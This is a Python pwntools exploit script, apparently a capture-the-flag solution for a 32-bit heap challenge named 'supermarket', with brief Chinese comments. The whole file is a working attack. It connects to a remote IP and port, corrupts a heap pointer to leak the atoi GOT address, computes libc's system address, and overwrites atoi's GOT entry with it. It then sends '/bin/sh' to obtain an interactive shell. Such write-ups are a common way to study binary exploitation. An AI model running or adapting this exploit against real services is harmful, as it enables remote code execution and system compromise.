# -*- coding: utf-8 -*-
from pwn import *
# 段问题：远程可以，本地不行
'''
堆中有堆，改堆指针任意写。
'''
context(log_level='debug')

p=remote("111.198.29.45",40923)
#p = process("./supermarket")
elf = ELF("./supermarket")
libc = ELF("./libc.so.6")

def add(name,size,content):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("price:")
    p.sendline(str(0x39))
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(content)

def dele(name):
    p.recvuntil("your choice>> ")
    p.sendline("2")
    p.recvuntil("name:")
    p.sendline(name)

def list():
    pass

def change(name,size,content):
    p.recvuntil("your choice>> ")
    p.sendline("5")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(content)

#gdb.attach(p)
'''
add("a",0x30,"bbb")
add("b",0x30,"ccc")
pause()
change("a",0x40,p32(0x0804c06c))
pause()
add("c",0x30,"ccc")
payload = p32(0x39) + p32(elf.got["atoi"])+p32(0x30)
add("d",0x30,payload)
p.recvuntil("c: price.57, des.ccc")
#change("b",0x39,p32(0x22))
'''
add("a",0x80,"aaa")
add("b",0x30,"ccc")
change("a",0xa0,"")
add("c"*8,0x40,"ddd")
change("a",0x80,"a"*4+"\x00"*12+p32(0x39)+p32(0x40)+p32(elf.got["atoi"]))
p.recvuntil("your choice>> ")
p.sendline("3")
recv = p.recvuntil("---------",drop=True)
atoiAddr = u32(recv[-6:-2])
log.success("atoiAddr:"+hex(atoiAddr))
libcBase = atoiAddr - libc.symbols["atoi"]
systemAddr = libcBase + libc.symbols["system"]

change("aaaa",0x40,p32(systemAddr))
p.recvuntil("your choice>> ")
p.sendline("/bin/sh")

p.interactive()
